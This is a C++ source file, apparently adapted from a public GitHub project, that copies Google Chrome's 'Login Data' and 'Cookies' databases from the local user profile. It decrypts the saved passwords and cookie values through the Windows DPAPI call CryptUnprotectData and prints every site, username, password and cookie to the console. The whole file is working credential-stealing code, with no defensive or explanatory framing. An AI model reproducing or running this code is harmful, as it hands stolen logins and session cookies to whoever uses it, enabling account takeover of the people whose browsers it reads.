//based on https://github.com/adnanonline/chrome-passwords
#include "pch.h"
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#pragma warning(disable:4996)
#include <Wincrypt.h>
#pragma comment(lib, "Crypt32")
#include <vector>
#include "sqlite3.h"
#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)

using namespace std;

enum credentialType
{
	password,
	cookie,
};

struct credential
{
	credentialType type;
	string realm;
	string id;
	string secret;
};

vector<credential> getData(sqlite3 *db, string query, credentialType type)
{
	vector<credential> results;
	sqlite3_stmt *pStmt;
	int rc = sqlite3_prepare(db, query.c_str(), -1, &pStmt, 0);
	if (rc != SQLITE_OK)
	{
		return results;
	}
	rc = sqlite3_step(pStmt);

	while (rc == SQLITE_ROW)
	{
		credential cred;
		cred.type = type;
		cred.realm = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 0));
		cred.id = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 1));
		DATA_BLOB encrypted, decrypted;
		encrypted.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encrypted.pbData = (byte *)malloc((int)encrypted.cbData);
		memcpy(encrypted.pbData, sqlite3_column_blob(pStmt, 2), (int)encrypted.cbData);
		CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted);
		char *c = (char *)decrypted.pbData;
		cred.secret = string(&decrypted.pbData[0], &decrypted.pbData[decrypted.cbData]);
		LocalFree(decrypted.pbData);
		results.push_back(cred);
		rc = sqlite3_step(pStmt);
	}

	rc = sqlite3_finalize(pStmt);
	return results;
}

vector<credential> getPass(sqlite3 *db)
{
	return getData(db, "SELECT action_url, username_value, password_value FROM logins", credentialType::password);
}

vector<credential> getCookies(sqlite3 *db)
{
	return getData(db, "SELECT HOST_KEY,path,encrypted_value from cookies", credentialType::cookie);
}

sqlite3* getDBHandler(string dbFilePath)
{
	sqlite3 *db;
	sqlite3_open(dbFilePath.c_str(), &db);
	return db;
}

bool copyDB(string source, string dest)
{
	//relative to chrome directory
	string path = getenv("LOCALAPPDATA");
	path.append("\\Google\\Chrome\\User Data\\Default\\");
	path.append(source);
	//copy the sqlite3 db from chrome directory (chrome could be running and file locked)
	ifstream src(path, std::ios::binary);
	ofstream dst(dest, std::ios::binary);
	dst << src.rdbuf();
	dst.close();
	src.close();
	return true;
}

void display(vector<credential> creds)
{
	for (auto cred : creds)
	{
		if (cred.type == credentialType::password)
		{
			cout << "Realm: " << cred.realm << endl;
			cout << "User: " << cred.id << endl;
			cout << "Password: " << cred.secret << endl << endl;
		}
		else
		{
			cout << "Realm: " << cred.realm << endl;
			cout << "Path: " << cred.id << endl;
			cout << "Cookie: " << cred.secret << endl << endl;
		}
	}
}

int main(int argc, char **argv)
{
	const string passwordSrc = "Login Data";
	const string passwordDest = "passwordsDB";
	copyDB(passwordSrc, passwordDest);
	sqlite3 *passwordsDB = getDBHandler(passwordDest);
	display(getPass(passwordsDB));
	sqlite3_close(passwordsDB);
	remove(passwordDest.c_str());
	
	const string cookiesSrc = "Cookies";
	const string cookiesDest = "cookiesDB"; 
	copyDB(cookiesSrc, cookiesDest);
	sqlite3 *cookiesDb = getDBHandler(cookiesDest);
	display(getCookies(cookiesDb));
	sqlite3_close(cookiesDb);
	remove(cookiesDest.c_str());

	return 0;
}